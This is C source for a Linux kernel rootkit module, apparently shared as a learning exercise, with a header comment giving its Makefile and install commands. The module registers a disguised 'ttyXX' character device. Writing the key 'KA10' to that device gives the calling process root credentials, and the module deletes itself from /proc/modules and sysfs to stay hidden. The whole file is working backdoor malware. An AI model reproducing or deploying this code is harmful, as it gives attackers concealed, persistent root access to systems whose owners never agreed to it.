/*
Just learning some tings

Makefile: 
-----------
obj-m += r00tk1t.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
------------
then: $ insmod rootkit.ko
      $ chmod 0666 /dev/ttyXX
and we good to g0g0!


*/

#include <linux/init.h>   
#include <linux/module.h> 
#include <linux/kernel.h>
#include <linux/device.h>
#include <linux/fs.h>    
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Ka^Io");

#define DEVICE_NAME "ttyXX"
#define CLASS_NAME "ttyXXC"

int el3v4t3(void);
static int            majorNumber; 
static struct class*  rootcharClass  = NULL;
static struct device* rootcharDevice = NULL;
static int     root_open  (struct inode *inode, struct file *f);
static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);

static struct file_operations fops =
{
  .open = root_open,
  .read = root_read,
  .write = root_write,
};

static int root_open (struct inode *inode, struct file *f)
{
   return 0;
}

static ssize_t root_read (struct file *f, char *buf, size_t len, loff_t *off)
{
  return len;
}

static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
{ 
  char   *data;
  char   key[] = "KA10";
  
  data = (char *) kmalloc (len + 1, GFP_KERNEL);
    
  if (data)
  {
    copy_from_user (data, buf, len);
    if (memcmp(data, key, 4) == 0)
    {
	    el3v4t3();
    }
    kfree(data);
	  
  } else {
	printk(KERN_ALERT "ttyRK:Unable to allocate memory");
  }

    return len;
}

int c0v3rtr4x(void)
{
    list_del_init(&__this_module.list); // for proc/modules
    kobject_del(&THIS_MODULE->mkobj.kobj);   // for sys/module
    return 0;
}

int el3v4t3(void)
{
    struct task_struct *t4sk;
    struct cred *cr3d;
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    t4sk = get_current();
    if (t4sk == NULL) 
    {
      printk("Failed to get current task info.\n");
      return -1;
    }

    cr3d = prepare_creds();
    if (cr3d == NULL) 
    {
      printk("Failed to prepare new credentials\n");
      return -ENOMEM;
    }

    cr3d->uid = kuid;
    cr3d->gid = kgid;
    cr3d->euid = kuid;
    cr3d->egid = kgid;

    commit_creds(cr3d);
    return 0;    
}

static int __init g0g0(void)
{   
   if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
   {
      printk(KERN_ALERT "ttyRK failed to register a major number\n");
      return majorNumber;
   }
   printk(KERN_INFO "ttyRK: major number %d\n", majorNumber);
 
   // Register the device class
   rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
   if (IS_ERR(rootcharClass))
   {
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "ttyRK: Failed to register device class\n");
       return PTR_ERR(rootcharClass); 
   }

   printk(KERN_INFO "ttyRK: device class registered correctly\n");
 
   // Register the device driver
   rootcharDevice = device_create(rootcharClass, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
   if (IS_ERR(rootcharDevice))
   {
       class_destroy(rootcharClass);
       unregister_chrdev(majorNumber, DEVICE_NAME);
       printk(KERN_ALERT "ttyRK: Failed to create the device\n");
       return PTR_ERR(rootcharDevice);
   }

   c0v3rtr4x();
   return 0;
}

static void __exit farewell(void)
{
    device_destroy(rootcharClass, MKDEV(majorNumber, 0));
    class_unregister(rootcharClass);                     
    class_destroy(rootcharClass);                        
    unregister_chrdev(majorNumber, DEVICE_NAME);

    printk(KERN_INFO "goodbye\n");
    return;
}

module_init(g0g0);
module_exit(farewell);
